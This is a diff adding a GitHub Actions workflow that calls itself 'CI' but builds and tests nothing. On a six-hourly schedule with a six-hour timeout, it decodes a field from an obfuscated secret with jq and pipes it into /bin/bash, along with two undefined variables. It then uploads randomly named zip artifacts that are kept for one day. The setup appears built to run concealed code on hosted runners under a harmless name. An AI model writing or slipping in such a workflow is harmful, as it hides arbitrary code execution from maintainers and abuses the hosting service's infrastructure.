@@ -1,0 +1,35 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '43 0,6,12,18 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          rez7768: ${{ secrets.rez7768 }}
+        run: |
+          printf '%s' "$rez7768" | jq -r .k83 | /bin/bash
+          echo $znmxn12 | jq -r .y492 | /bin/bash
+          echo $cya8746 | jq -r .xlgkf06 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: aT53AMls
+          path: "*.zip"
+          retention-days: 1
